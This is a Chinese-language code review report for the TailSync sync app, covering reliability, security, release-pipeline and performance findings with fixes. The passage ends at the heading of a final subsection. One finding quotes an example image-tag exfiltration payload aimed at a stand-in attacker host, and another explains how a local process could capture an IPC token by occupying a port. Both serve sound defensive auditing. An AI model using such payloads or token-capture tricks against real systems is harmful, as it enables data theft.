# TailSync 全量代码审查（2026-08-28）

> 审查范围：`shared/rust-core`（~3.2 万行）、macOS 客户端（SwiftUI + Rust 守护进程）、Windows 客户端（React/TS + Tauri）、site / themes / scripts / CI / docs / deploy。
> 方法：四路并行深查 + 对全部高优先级结论逐条二次人工复核（引用的代码行均已重新打开核对，非转述）。
> 结论总体判断：**工程质量高于同类个人项目平均水平**（协议纵深防御、内存上限意识、private_fs、更新降级防护、测试文化都做得扎实）。主要改进点集中在：投递/剪贴板路径的失败处理语义（无界重试与队头冻结、假成功）、Tauri 权限面与 CSP、发布管线的验证盲区（私钥↔公钥配对、release 并发）、以及若干性能与体验问题。
> **重要更正（2026-08-28 二次复核）**：初版的两条 P0 均已修正——"更新签名格式错误"为**误报**（实测证伪，见一.1）；"静默删除已接收文件"的 ACK 时序描述有误、严重性降级（见一.2）。本报告的行动排序已按修正后的事实重排。

> **执行状态（2026-08-28 收口）**：报告中可在仓库内完成的代码、CI、文档与测试修复已落地，覆盖可靠投递与接收恢复、事件失败重试、传输写入超时、发布签名/跨 tag 校验、macOS 私有 Unix socket、Tauri 权限收窄、预览 ErrorBoundary、主题包校验及体验项。自动化回归均已通过；完整 macOS 打包 daemon smoke 尚未执行，因为当前运行中的 `/Applications/TailSync.app` 占用 TCP `19890`，本次未强行终止用户进程。

---

## 一、高优先级问题（均已二次复核确认）

### 1. ~~更新 manifest 的 signature 格式错误~~ —— 误报，已实测证伪（2026-08-28）

**原判断**：`generate-update-manifest.mjs:63` 原样写入 `.sig` 内容，与 tauri-plugin-updater 期望的 base64 编码不符，会导致所有自动更新签名校验失败。

**证伪证据（本机实测，仓库内 Tauri CLI）**：`tauri signer generate` 写出的 `.pub` 文件本身就是单行 base64；`tauri signer sign` 写出的 `.sig` 文件同样是**单行 base64**（实测 400 字节、零换行），base64 解码后才是标准 minisign 文本（untrusted comment + 签名 + trusted comment + 全局签名四行）。对照插件 2.10.1 的 `verify_signature`（`base64_to_string(field)` → `Signature::decode(text)`）：**manifest 原样写入 `.sig` 内容恰好是正确行为**——字段一次 base64 解码正好还原出 minisign 文本。若按原建议再包一层 base64，反而会校验失败。repo 自身的 pubkey 字段也验证了同一约定（解码后为 minisign 公钥文本）。

**误报根源**：只核了插件源码（base64 解码那半截推断是对的），没有实测 `.sig` 文件的真实格式，想当然假设它是标准 minisign 四行文本。教训：**两端约定的验证必须两头都落地实测**。

**不受证伪影响、仍然成立的相邻结论**：一.5（发布管线从不验证 CI 私钥与仓库公钥的配对——publish job 加 `tauri signer verify` 即可用公开信息闭合信任链）；release.yml:229 重跑脚本单测对已生成 manifest 无校验作用；更新链路尚无真机闭环验证记录（HANDOFF-2026-08-28.md:110）——且本次实测恰好演示了这个验证闭环怎么做。

### 2. 断连竞态中的提交失败：删除已校验文件 + 取消批次，浪费全部已传数据（原 P0 降级为 P1）🟠

**原判断的更正（2026-08-28 二次复核）**：原条目称"发送方已收到最终 FileAck、认为传输成功，接收端却删文件，两端都无告警"。**ACK 时序描述有误**：server.rs 的 FileChunk 分支先 `await verify_and_commit_received_file(...)`、**提交成功后**才发送最后的 FileAck（server.rs:566-590）；提交失败走 Err 分支——发送方收到错误帧，接收端执行 `notify_file_batch_failed` + `cancel_file_batch`（server.rs:591-598），发送端恢复逻辑随后 disconnect 并通知用户。**不存在"双端都认为成功"的静默数据丢失**。

**代码事实不变、仍然成立的部分**：
- commit 依赖内存 batch 状态（sync.rs:887-891），`spawn_blocking` 哈希窗口内 `suspend_receive_epoch`（sync.rs:982-988）可将其清掉，提交失败时**已通过哈希校验的文件被直接删除**（sync.rs:1187-1189）；
- 错误分支的 `cancel_file_batch` 把批次记入 `cancelled_batches`（保留 24h，sync.rs:31），期间同 batch_id 的自动重试被 `begin_file_batch` 拒绝（"copy the files again to retry"）。

**真实故障语义**：失败可见、数据不丢，但**已传输的字节全部浪费**——用户看到"传输失败"通知，重新复制（新 batch_id）后全量重传；竞态中被删除的文件即使保留也无法被新批次复用。另一真实变体：哈希计算中途连接任务被 abort → commit 根本没执行 → 文件在磁盘、manifest slot 为空、发送方未收到 ACK → 同批次重连重试时该文件从头重传（slot 未持久化，`restore_persisted_received_file` 无从恢复）——即复核所指出的"断连窗口丢失已完成接收进度、导致重传"。

**修正后的修法**（单纯"保留文件"确实不够——那只会留下不可达的孤儿明文，正如复核指出；需配套状态恢复）：
1. commit 失败**不删文件、也不取消批次**——把"batch 状态消失"类瞬态失败与"哈希不匹配"类永久失败分开处理（与问题三讨论的接收端错误分型同一原则）；
2. commit 从磁盘 `.batch.json` 自愈（`begin_file_batch` 已有同款加载校验逻辑可复用），使提交不依赖内存态；
3. 重连对账：`begin_file_batch` 对空 slot 扫描 incoming 目录做名称/大小/哈希比对回填（复用 `restore_persisted_received_file` 的校验），覆盖 abort 变体。

### 3. 可靠投递无跨重连的尝试上限 + 每 peer 队头阻塞 🟠

`shared/rust-core/src/peer/delivery.rs`：

- `DeliveryError::is_retryable`（:434-437）把 Timeout/Transport/Protocol 全部视为可重试，仅 `Rejected` 是永久失败；
- worker 内层失败后把帧放回 `pending` 并 break（:1108-1115），外层 loop 重连后重新投递，**没有任何总尝试数或截止时间**。

后果：一个永远得不到 ACK 的帧会以约 `5s 重连延迟 + 单连接内 4 次尝试`（事件 750ms×4 ACK 超时 + 250/500/1000ms 退避）的周期无限重试，每轮一次完整 Noise 握手；且该 peer 的 priority/bulk 队列里**后续所有帧被它阻塞**（worker 只有 `pending` 为空才从队列取新帧）。

深读后的两点细化（2026-08-28 追加）：

1. **入队侧并非无界**：每队列容量 64（pool.rs，`POOL_CHANNEL_SIZE`），入队有 5 秒超时（`POOL_SEND_TIMEOUT`），超时即报 `delivery_stalled` 告警并向调用方返回错误——所以是"队头冻结 + 新帧 5 秒后被拒"，不是无限内存增长；
2. **事件帧有自然兜底，文件帧没有**：接收端校验事件时间戳（±5 分钟窗，protocol lib.rs:32 `EVENT_TIMESTAMP_WINDOW_MS`），对端回来后过期事件会被 `Rejected`（永久失败）自然终结重试；但**文件/批次帧没有时间戳窗**，才是真正意义上的无限重试。这也意味着对事件的放弃预算应与 5 分钟窗对齐——超过这个窗的重投本来就会被拒。

**修复**：给 `PendingFrame` 加首次入队时间戳/总尝试数，超限后 `complete(Err(...))` 丢弃并记 warning（`sync_warning` 机制已具备）。

**文件专用通道的可行性（2026-08-28 追加）**：为文件传输单独建一条连接、与事件通道分离，协议层**已经天然支持**——接收端本就接受同源多条认证连接（各自独立 handler/receive epoch/suspend guard，server.rs:274-282）；批次状态按承载连接的 epoch 挂接（server.rs:393-398 用 `begin_file_batch_at_epoch`，多连接并存时生命周期隔离正确）；去重/批次/传输状态全部按 `(source, id)` 键控而非连接；剪贴板防覆盖（`clipboard_generation`）是引擎级状态、连接无关，双通道下语义不变；入站限额 64 总数/8 每源（connection_limiter，mod.rs:473），每 peer 2 条连接余量充足。改造集中在平台层 pool：键从 `(target, hostname)` 扩为含用途，`run_connection_worker` 已以双通道为参数、可按用途各起一个；接收端**零改动**。收益：事件永不等待文件块；文件风暴/重连/批次失败清理（`disconnect_hostname` 目前会杀掉该 peer 全部流量）不再波及事件通道。推荐按需形态：批量开始时才拉起文件连接、空闲后回收，稳态连接数不变。附带红利：事件与文件分离后块尺寸可以反向调大（减少每块 fsync 开销、提升慢链路吞吐），因为事件不再关心块多大。

**大图片是否同走文件道——评估后否决（2026-08-28）**：技术上可行（事件帧与连接无关，接收端零改动，且图片帧在文件道内仍走 priority、可插队文件块），但需要新增跨通道排序护栏（信封时间戳判"只入历史不碰剪贴板"，防止快道图片先到、慢道文字后到覆盖剪贴板），外加阈值策略与竞态测试。不划算的不对称性在于：文件是长时占用（分钟到小时级）且防覆盖保护已存在（clipboard_generation），分道收益大代价小；大图是秒级一次性独占，且图片与文字同为剪贴板事件、先后顺序即剪贴板语义本身，拆开是为次要目标动核心不变量。决策：**专用道只承载文件；图片留在事件道**。接受的残余：慢链路上一张大图（数 MiB、单帧不分块）仍会独占事件道约十几秒，为该设计下最大的延迟尖峰，量级与文件问题差两个数量级。将来若成为真实抱怨，升级路径未关闭（时间戳护栏 + 图片分块化）。

**大图的进度条与取消（2026-08-28 追加）**：可行且不需要图片文件化。`write_frame`（secure.rs:144-171）本就将大帧切成 ≤64KB 加密记录循环写出、逐记录 `write_all` 随背压推进——在该循环挂 observer（on_bytes/should_cancel）即得发送端真实进度与协作取消，属 core 小改。进度语义为发送侧（受 socket 缓冲影响可略超前于真实送达，末段显示"等待确认"即可）；取消在记录间生效，协议无帧中止概念，取消后按传输错误断开重连（局域网亚秒恢复）。UI 复用现有 FileProgress 面板（can_stop 语义现成），大图作为一条进度项。配套必须补的洞：事件帧的 `write_all` 目前**无任何超时**（对比文件路径有每块 5 分钟调用方兜底，事件广播连 completion 都没有），接收端卡死时大图写入被背压无限挂起、事件道整体停摆直到 TCP 自身放弃——应加"进度停滞截止时间"（如 30-60 秒无推进判传输错误），它同时是取消的强制执行点。被否决的替代方案：图片转用文件批次机制（获得断点续传与双向取消）——图片上限仅数 MiB、整图重传代价低，且落地会变成文件引用而非图像位图，语义倒退，收益不抵成本。

**慢链路大文件对事件同步的影响（2026-08-28 追加）**：文件发送是停等式分块（一次只有一个 1 MiB chunk 在途，clipboard.rs 批量循环逐块等 offset ACK），chunk 走 bulk 队列、事件走 priority 队列并在 chunk 边界优先插队——设计意图正确且不会堆满队列。但存在三个薄弱点：(1) chunk 在途期间事件必须等它完成，等待上限 ≈ 1 MiB/带宽 + RTT + 对端每块 fsync（100 KB/s ≈ 11s，10 KB/s ≈ 100s）；(2) ACK 等待超时 10s（`file_ack_timeout`）对高延迟/慢链路偏紧，超时后同块重发 4 次（重复推 1 MiB）再重连，且 worker 重连后**先重投 pending chunk 再服务队列**（delivery.rs:1013-1041 的顺序），事件在整个重试风暴期间饥饿；(3) `write_frame` 本身无超时，对端停止读取时写入被 TCP 背压无限挂起——但调用方每 chunk 有 5 分钟完成超时（`FILE_CONFIRM_TIMEOUT`）兜底。值得表扬的是失败恢复路径：批量失败会 `disconnect_hostname`（杀 worker、丢弃 pending）+ 发 `FileBatchCancel`（clipboard.rs:472-486），队列不会永久卡死。改进方向：`file_ack_timeout` 自适应或加大；重连后先服务等待中的 priority 帧再重投 pending（序列号语义安全：事件序列号只与事件帧比较，先发事件后补 chunk 不破坏单调性）；如需彻底消除块粒度等待，考虑事件走独立连接。

**追加发现（2026-08-28，深读 event_receiver 后）**：接收端把**所有**事件处理失败——包括瞬态失败——都通过 `secure::write_error` 回给发送端（server.rs:338-342），而发送端把任何 PeerError 映射为 `Rejected`（delivery.rs:644-648）即**永久失败、立即放弃**。这意味着接收端一次瞬态的剪贴板占用（问题七的 OpenClipboard 竞争）、一次磁盘抖动，都会让一条**新鲜的**消息被永久丢弃而不是重试。瞬态/永久失败的边界画错了位置：接收端错误应区分"可重试"（clipboard 忙、IO 瞬态——不回 PeerError、直接不 ACK 让发送端走超时重试）与"永久"（时间戳过期、格式非法、授权撤销）。与此相关，原文档"中等问题 8"描述的"剪贴板写入失败后对端重试、内容再次写入剪贴板"只在错误帧丢失（连接恰好断开）时成立，正常路径下是永久丢弃。

### 4. 官网主题工坊分发的是过期的 2.0.0 主题包 🟠

- 实测解包：`themes/packages/flux-circuit.tailsync-theme` 内 `theme.json` 是 **2.0.0**（旧构建产物），而源文件 `themes/flux-circuit/theme.json` 和带版本号的 `flux-circuit-2.0.1.tailsync-theme` 都是 2.0.1。五个无版本号文件全是旧包，均在同一次提交（0ba0952）混入。
- `site/src/themes/themeData.ts:321-369` 的下载 URL 恰好全部指向这五个旧包（`:302` 拼 `raw/main/themes/packages/...`）。
- 没有任何 CI/脚本校验 `themes/packages/*` 与 `themes/*/theme.json` 的一致性（重建工具只作为手动命令存在于 docs/THEMING.md:209-210）。
- **修复**：删除五个旧包，链接钉到带版本号文件；建议在 CI 里用 theme_package_tool 重打包并 diff，防再次漂移。

### 5. 发布管线从不验证"CI 私钥 ↔ 仓库公钥"配对，可静默发布不可验证的更新 🟠

- `validate-updater-config.mjs` 只校验公钥格式与两端配置一致；`generate-update-manifest.mjs:64-65` 只查 `.sig` "存在且非空"；`verify-published-update.mjs:40-42` 对线上签名同样只查非空。
- 若 GitHub Secret 中的私钥被轮换/配错（RELEASE.md:47-49 自己承认轮换需要过渡版本），整条流水线全绿，但所有客户端永远验证失败——"发布成功但更新静默死亡"的单点盲区。
- **修复**：publish job 增加 `tauri signer verify -A shared/updater.pub release/*.nsis.zip`（或等价 minisign verify），用公开信息闭合信任链。
- 附带：`release.yml:229` 在 publish 前重跑 `generate-update-manifest.test.mjs`（跑的是脚本单测）对刚生成的 manifest 无任何校验作用，属安慰性步骤，应替换为对 `latest.json` 内容本身的断言。

### 6. release workflow 跨 tag 竞态 🟠

- `.github/workflows/release.yml:11-13` 的 concurrency group 是 `release-${{ github.ref }}`（按 tag 分组）：两个不同 tag 同时推送时并行运行、互不取消。
- 验证步骤（:265-275）抓的是 `releases/latest/download/latest.json`：若另一 tag 的 release 在此间隙发布，本 workflow 版本比对假性失败；两个 `latest.json` 后写者胜，先完成的发布被悄悄覆盖而其验证早已跑完。
- **修复**：concurrency 改为全局组（如 `release-publisher`）；验证直接抓本 tag 的 `releases/download/<tag>/latest.json` 并与本地生成内容比对。

### 7. macOS 本地 IPC：token 会送给"占据 19889 端口的任何进程" 🟠

**2026-08-28 二次实证：问题在当前代码中原样存在，且攻击面比初版描述更宽。** 已重新逐条核验：token 由应用生成、经 stdin 管道交给守护进程（TailSyncApp.swift:613-626，并清除 `TAILSYNC_API_TOKEN` 环境变量）；应用硬编码连接 `127.0.0.1:19889`（ApiClient.swift:65,110），**每个请求**的首行 JSON 都携带 token（:94，轮询频率下约每 2.5 秒重发一次，攻击者无需掐时机）；守护进程端口被占时无限重试 bind（transport.rs:95-115）；全仓库无 Unix socket / `LOCAL_PEERCRED` / 连接对端 pid 校验（grep 实证）；相关文件自审查后无加固提交。

- **严重性校准（按实证）**：前提是本地同用户恶意进程，无远程暴露面。真实增益是**绕过加密历史库**——`get_preview_data` 解密历史明文，而 DEK 在钥匙串受签名 ACL 保护，本是同用户恶意软件少数读不到的资产之一，正是本项目威胁模型的核心保护对象。两点降级：假冒 daemon 推假更新走不通（更新安装有客户端签名校验）；`validate_theme` 任意路径读对同用户恶意软件无增益（本可直接读文件）。结论：在项目自身的威胁模型内成立，与 private_fs / keychain DEK 的既有投入不一致。
- **攻击窗口不止首次启动**：看门狗失败重启（约 6 秒周期）、更新安装、唤醒恢复都是窗口。
- **修复比想象的便宜——pid 信息双方现成**：应用已持有守护进程 pid（TailSyncApp.swift:631），守护进程已持有父进程 pid（:604 `TAILSYNC_PARENT_PID`），只是从未用于连接校验。改 Unix domain socket（macOS `LOCAL_PEERCRED` 可取对端 pid）后双向校验：daemon 校验客户端 pid == 父进程、应用在发送 token 前校验服务端 pid == 自己拉起的进程。一并消灭"每天 10 万+ 次 TCP 连接 churn"与 JoinSet 累积。

### 8. Windows Tauri 权限面过宽，且敏感权限授予渲染不可信内容的 preview 窗口 🟠

- `windows/src-tauri/tauri.conf.json:42-44`：`"shell": { "open": true }` 允许以系统默认程序打开**任意路径/URL/scheme**，无 regex 收窄（macOS 侧同样 `open: true`）。
- `capabilities/default.json:6-9`：`"windows": ["*"]` 把 `shell:allow-open`、`clipboard-manager:default`（可写系统剪贴板）、`dialog:allow-open` 一并授予所有窗口——包括持续渲染**远端 peer 剪贴板内容**（SVG/Markdown/DOCX/PDF）的 preview 窗口。一旦任何渲染器被注入，攻击者可直接打开任意文件或污染用户剪贴板（钓鱼场景：替换剪贴板里的钱包地址）。
- 同文件 CSP（tauri.conf.json:17）：`img-src ... https:` 过宽——被注入的 `<img src="https://evil.com/?leak=...">` 不受 `connect-src` 约束，构成数据外泄通道；前端渲染器实际只用 blob:（ImagePreview.tsx:24），`https:` 疑似遗留。macOS 侧 CSP 同样带 `https:`。
- **修复**：`open` 改为 `"^https?://"` regex；按窗口 label 拆分 capabilities（preview 窗口不需要 clipboard 写权和 dialog 权限）；`img-src` 去掉 `https:`。

### 9. 零 React Error Boundary，preview 窗口渲染异常即永久白屏 🟠

- 整个 `windows/src` 无任何 `ErrorBoundary`/`componentDidCatch`；三个入口直接 `createRoot().render()`。
- preview 窗口专门解析复杂格式（PDF/DOCX/SVG/Markdown），任何渲染期未捕获异常都会让 React 19 卸载整棵树 → 无边框窗口白屏，且该窗口会被 `window_lifecycle.rs:188-212` 隐藏销毁，用户下次打开才恢复。`onCorrupt` 只覆盖各渲染器显式 catch 的路径。
- **修复**：至少给 `PreviewContent` 的每个 lazy 渲染器包一层 ErrorBoundary，fallback 到 TextPreview/unsupported 视图。

### 10. 其他已确认的高影响点

| 问题 | 位置 | 摘要 |
|---|---|---|
| JoinSet 永不回收 | `macos/src-tauri/src/api/transport.rs:44-91` | `join_next()` 只在 accept 循环退出（进程关闭）后调用；Swift 侧通知轮询/看门狗合计约 1-1.5 连接/秒，已完成任务条目在 JoinSet 内永久累积（长驻数周不可忽视的慢性泄漏）。修复：accept 循环里周期性 `try_join_next()` 清空。 |
| 入站握手无超时 | `shared/rust-core/src/secure.rs:415-507` | `accept_inner` 两次 `read_plain_frame` 均无 timeout；建立 TCP 后不发字节即可无限期占住 ConnectionLimiter 配额（出站方向有 `handshake_timeout`，入站没有对称保护）。修复：加 10-15s 超时。 |
| 主线程同步 cargo build | `macos/swift-ui/.../TailSyncApp.swift:575-597` | `launchDaemon` 回退路径在主线程 `waitUntilExit()` 等待整个 cargo build，bundle 损坏/开发环境错配时菜单栏冻结数分钟；且用的 `launch()`/`launchPath` 是废弃 API。 |
| clipboard-helper stdin 写入无超时 | `macos/src-tauri/src/clipboard_file.rs:40-53` | `write_all` 在 `wait_for_child` 的超时之外，helper 挂起则调用线程永久阻塞；且该同步函数直接在 async 上下文执行（读取方向 `clipboard.rs:220` 用了 spawn_blocking，写入方向没有）。 |
| CF_DIB 回退：句柄泄漏 + 假成功 | `windows/src-tauri/src/commands.rs:1282-1303` | `SetClipboardData` 失败时不 `GlobalFree(h)`（每次失败泄漏全局内存）；`OpenClipboard` 失败静默 return，调用方照常 `bump_clipboard_version` 返回 Ok——UI 显示"已恢复"但剪贴板未写入，且 shadow filter 已加入导致 30 秒内不重播，旧值同步静默丢失。 |
| 托盘每秒全量递归遍历存储目录 | `windows/src-tauri/src/tray.rs:369-391` + `db/storage.rs:117-144` | 每秒 `storage_status()` → 递归 read_dir + 全文件 stat（配额默认 10 GiB，可能数千文件），还每秒抢一次 db Mutex；托盘实际只需要 `available` 布尔值，算出大小又丢掉。 |

---

## 二、中等问题

**Rust core**

1. **每次历史删除都 `PRAGMA wal_checkpoint(TRUNCATE)`**（`db/lifecycle.rs:353-357`）：`add_text/add_image` 的去重路径每次复制重复内容都命中这里，触发全量 WAL checkpoint + fsync。安全动机（secure_delete）合理，建议节流或仅在重路径执行。
2. **关键词搜索是全表扫描 + 逐行 AES 解密**（`db/queries.rs:120-197`）：无 LIMIT、逐行解密做明文匹配，`count_all_filtered` 同路径只拿计数。`history_limit ≤ 500` 尚可，建议引入可选 FTS 或只解密前缀。
3. **u32 序列号回绕后整条连接永久判重放**（`event_receiver.rs:47` 与 delivery.rs:1050/1091）：2^32 帧后回绕到 1，`1 <= last` 恒成立。极难触达但属确定性缺陷，建议容忍 `last == u32::MAX && seq == 1` 或改 u64。
4. **用 `contains("event timestamp is outside...")` 字符串匹配决定告警**（`delivery.rs:400-404`）：违背同文件模块注释自己声明的"不用字符串匹配决定行为"原则，错误措辞改动会让告警静默消失。应加 `DeliveryError::Expired` 变体。
5. **事件先写库后记 dedup**（`event_receiver.rs:63-83`）：剪贴板写入失败时消息 ID 未记录，对端重试会把内容再次写入剪贴板（历史库靠哈希去重自愈）。可改为先 record 再应用。
6. **`apply_settings_update` 持 DB 锁执行可能触发 VACUUM 的清理**（`crypto.rs:505-510`）：大库上 `enforce_limits`/`clear_all` 在 `Arc<Mutex<HistoryDB>>` 内同步执行，期间所有历史读写阻塞。
7. **收到的文件名未过滤 Windows 保留设备名**（`sync/prepare.rs:102-123`）：`CON`/`PRN`/`AUX`/`COM1`… 在 Windows 上写入失败，表现为传输报错。低危，建议两端统一补规则。

**macOS**

8. 看门狗重启无退避与上限（`TailSyncApp.swift:752-837`）：daemon 启动即崩时以约 6 秒周期无限"拉起→杀死"。建议指数退避 + 用户可见告警。
9. `resolve_clipboard_helper` 优先搜 cwd 相对路径、可执行文件同目录放最后（`clipboard_file.rs:290-312`）：发布形态下应优先同目录（同签名 bundle 内）的 helper。另外 `--write-files` 用 argv 传文件路径，本地任何进程可用 `ps` 看到剪贴板文件名，建议也走 stdin。
10. `get_version` 返回的是剪贴板变更计数而非协议版本，Swift 端 `getVersion()` 无调用者——**app/daemon 之间没有真正的版本握手**，更新后的版本偏差只能靠逐命令 "unknown command" 暴露。
11. Swift 单例里的 `fatalError`/强制解包（`ApiClient.swift:75-78` SecRandom 失败即崩、`Loc.swift:211` `.first!`、`as!` 强转）；Application Support 下 `com.tailsync.TailSync` 与 `com.tailsync.app` 两个目录并存。
12. `macos/src-tauri/src/api.rs:302-376` 与 `clipboard_file.rs:461-529` 是逐行等价的两份 Windows CF_HDROP unsafe 实现——两份 unsafe 代码漂移风险远高于普通重复。
13. `build-dmg.sh:15` 默认硬编码 `TAUI_CLI=../windows/node_modules/.bin/tauri`（跨目录脆弱依赖）；`dev.sh` 用 `pkill -9` 强杀且吞掉编译输出。

**Windows**

14. `delete_old_storage` / 主题命令族接受任意路径的 IPC 面（`commands.rs:1131-1138` 等）：core 侧防护认真（owner-marker 校验），但仍是注册给 WebView 的"删除带合法 marker 目录"原语；建议 Rust 侧维护"本次迁移结果"白名单。
15. invoke_handler 注册面明显大于前端使用面：60+ 命令中 `get_history`、`toggle_sync`、`trust_peer` 等多个无前端调用（`tailsyncClient.ts:253-259` 的 `getSyncWarning`/`getFileProgress` 是死代码且类型与实际返回不符）。建议拆分 daemon JSON API 路由与 WebView invoke 面。
16. `get_image_data` 无后端缩略图缓存（`commands.rs:751-772`）：历史列表翻页往返时同一图片反复"读库 + 全量解码 + base64"；前端 LRU 容量 50 且翻页即清。
17. 通知文案在 Rust 侧硬编码英文（`lib.rs:249-253` 等），而托盘做了完整中英双语——同一产品两条通知通道语言策略不一致。
18. 笔误类：骨架屏 key 序列 `[0,1,2,4]` 跳过 3（`History.tsx:1049`）；设置窗关闭按钮 title 复用 `settings.closePairing` 键（`Settings.tsx:711-712`），一旦文案改动无障碍标签会跟着错。
19. `useI18n` 跨窗口同步赌 WebView2 的 storage 事件（并不可靠），且回退用 `||` 而非 `??`；建议语言切换走后端事件（已有 `theme_changed` 先例）。

**工程设施**

20. **nginx**（`deploy/nginx/luminousity.conf`）：`/assets/` 因 add_header 继承规则丢失全部 server 级安全头（:33-41）；`expires` 与 `add_header Cache-Control` 叠用产生双 Cache-Control 头；无 HSTS/CSP/HTTP2/gzip（dist 里 70KB CSS、107KB JS 未压缩）；`dl.luminousity.online` 更新端点整段是死配置（两端 updater 实际都指向 GitHub Releases）。
21. **文档漂移**：RELEASE.md:61 说"三个 Cargo package"，实际 bump-version.mjs 维护 6 个、校验 8 处；HANDOFF-2026-08-28.md:122 称例外注册表"仅 bincode 一条"，实际已清空。
22. 根目录孤儿 `package-lock.json`（无对应 package.json，空壳被 git 跟踪）；ci.yml 与 release.yml 手写的测试文件清单已开始漂移。
23. CI 细节：release macOS job 在 `windows/` 里装依赖只为拿 tauri CLI；`ci.yml` 用 `macos-latest` 而 `release.yml` 用 `macos-14`，验证与发布的工具链版本可能不一致；site 无部署工作流（CI build 完即丢弃，部署全手工）。
24. `windows/src-tauri/src/clipboard.rs:724-920` 约 215 行标注"仅为回归测试保留"的旧单文件发送器，实测测试模块没有任何引用——纯死代码，建议删除。

---

## 三、架构与可维护性建议

1. **按 CONTEXT.md 自己的分层规则，还有三块"纯规则"逻辑滞留在平台层**，正是共享深模块的典型候选：
   - runtime 快照 / 通知缓冲 / 进度账本（macOS `api.rs` 与 Windows `api.rs` 已分叉出 `RuntimeNotificationBuffer`、`wait_runtime_snapshot` 等整块机制）；
   - SVG 信任门（`svgPreview.ts` 313 行与 macOS Swift 版手工双实现，靠 fixtures 防漂移——Rust 化后 fixture 可直接驱动 core 单测）；
   - Windows 通知文案/托盘双语键。
2. **超大文件继续拆**：`db.rs` 3184 行、`sync.rs` 2461 行、`delivery.rs` 2347 行。`run_connection_worker`（delivery.rs:908-1130）可独立成 `worker.rs`；History.tsx（1391 行）/Settings.tsx（1490 行）可按现有 section 边界拆分以降低重渲染审查成本。
3. **HistoryDB 的同步 I/O 契约靠约定不靠类型**：写路径用 spawn_blocking 包裹，读路径（磁盘读 + 解密 + 文件拷贝）无机制阻止在 async 上下文直接调用，建议提供 async 包装。
4. **macOS 换 Unix domain socket** 同时解决 token 对端验证、TCP churn、JoinSet 增长三个问题，是收益最高的结构性改动。
5. 补测试的优先位置：`run_connection_worker` 的"无限重试应放弃"策略（目前该策略不存在，补测试即补策略）；`verify_and_commit_received_file` 的 suspend 竞态（问题 2）；`Preview.tsx` 的 revision 竞态（回归风险最高的纯逻辑区域）。

---

## 四、做得好的地方（保持现状）

1. **帧协议纵深防御**：payload 上限在入队、`Frame::try_new`、头部解析、decode 四处一致校验；加密记录长度严格限定；协议 decode 有 proptest。
2. **重放/重复保护三层叠加**：(source, message_id) 去重窗 + 时间戳窗 + 每连接序列号单调检查；文件侧 transfer_id 幂等 + `.part` 偏移 resume 语义正确（逐条核对过）。
3. **private_fs**：创建时即 0600/0700、拒绝 symlink、断开硬链接、启动全树修复、Windows SDDL DACL，配套直接攻击面的测试——同类项目少见。
4. **内存上限意识贯穿全部状态表**：seen_messages/shadow/rate-limit/health tracker 均 1024 上限且有"超限后行为"的测试。
5. **迁移幂等设计正确**：v8→v9 每步可安全重入，失败记 `migration_issues` 而非让启动失败。
6. **Windows 前端净化**：SvgPreview 是教科书级（sandbox iframe + CSP 'none' + 事务性信任 + 私网 IP 分类）；MarkdownPreview DOMPurify 双重净化；专门找 XSS 入口未找到绕过路径。
7. **版本一致性矩阵**：bump-version.mjs 把 4 JSON + 6 Cargo.toml + 3 lockfile + 7 处文档纳入单一 bump + CI `--check`。
8. **i18n 纪律**：en/zh-CN 各 274 键完全对齐、占位符逐一匹配（脚本核验）。
9. **更新器降级防护双层**：插件层版本比较 + 包内 `tailsync-update.json` 与 manifest 一致性校验（防"签名有效但内容被替换"）。
10. **测试文化**：传输路径是真行为测试（内存内连接对驱动的 ACK/重试/竞速、真实 QUIC 栈配对测试），不是同义反复。

---

## 五、剪贴板写入路径家族审计（2026-08-28 追加）

针对"问题七"所属的家族（登记 shadow → 写剪贴板 → 失败不回滚），对两端全部剪贴板写入路径做了穷举式核对。**总体结论：全项目 15 条写入路径中只有 1 条真正写坏（`set_clipboard_dib`，两个 crate 各一份拷贝），但正确实现与错误实现并存且接错了线——Windows 的 UI 走的是坏实现，而同一个 crate 里就躺着一份正确的。**

### 路径清单与核验结果

| # | 路径 | 生效范围 | 失败处理 | 结论 |
|---|---|---|---|---|
| 1 | core `restore_text`（sync.rs:241-249） | 入站文本事件 + 两端 routes.rs 恢复 | 登记→写入→失败撤销 shadow + Err | ✅ 标准实现 |
| 2 | core `restore_image`（sync.rs:285-298） | 入站图片事件 + 两端 routes.rs 恢复 | 同上 | ✅ 标准实现 |
| 3 | Windows `commands.rs` restore_entry 文本分支（:365-370） | **Windows React UI（实际生效）** | 手工登记 + 失败撤销 | ✅ 但与 core 重复 |
| 4 | Windows `commands.rs` restore_entry 图片 arboard 主路径（:297-315） | 同上 | 同上 | ✅ 但与 core 重复 |
| 5 | Windows `set_clipboard_dib` 兜底（:1283-1303） | 同上 | **静默失败、无回滚、句柄泄漏** | ❌ 唯一写坏的 Win32 函数 |
| 6 | macOS `commands.rs` 孪生副本（:153-193 + :783-800） | **死代码**：macOS 守护进程不创建任何 webview 窗口，Swift UI 走 routes.rs；invoke_handler 闲置 | 真实 macOS 构建中坏分支被 cfg 裁掉 | ⚠️ 纯漂移风险 |
| 7 | Windows `routes.rs` restore_entry（:408-482） | JSON API（非主 UI 路径） | 调 core 标准实现 | ✅ 正确但没被主 UI 用上 |
| 8 | macOS `routes.rs` restore_entry（:520-594） | **Swift UI（实际生效）** | 调 core 标准实现 | ✅ |
| 9 | `files_received` → `write_clipboard_files`（两端 sync_adapter） | 入站文件批次 | 失败记日志 + 用户通知；文件回声抑制是**路径式**（managed 目录识别，clipboard.rs:242-250），不存在哈希毒化问题 | ✅ |
| 10 | Windows `clipboard_file.rs` write_clipboard_files（:139-195） | 文件恢复/入站批次 | GlobalFree 全配对、返回值全查 | ✅ Win32 范本 |
| 11 | Windows `api.rs` write_file_path_to_clipboard（:246-300） | 文件恢复 | 同样规范 | ✅ 但与 #10 重复 |
| 12 | macOS crate 内两份 `cfg(windows)` CF_HDROP 孪生（clipboard_file.rs:461-529、api.rs:302-376） | macOS 构建中永远裁掉 | 规范 | ⚠️ 四份重复中的两份 |
| 13 | macOS headless 子进程写入（clipboard_file.rs write_clipboard_text/image） | 守护进程无 Tauri 运行时时 | Err 传播、core 撤销 shadow | ⚠️ 回滚正确；stdin 无超时是已知的健壮性问题 |
| 14 | `restore_file_batch`（两端 commands.rs + routes.rs） | UI 批量恢复 | `?` 传播错误 | ✅ |
| 15 | Windows `sync_adapter.rs` write_image（:69-71）——纯 arboard，**无 CF_DIB 兜底** | **入站图片事件（实际生效）** | arboard 失败（如剪贴板被占用）→ Err → 消息不记录 → 发送方重试 | ❌ 审计新发现 |

### 审计新发现

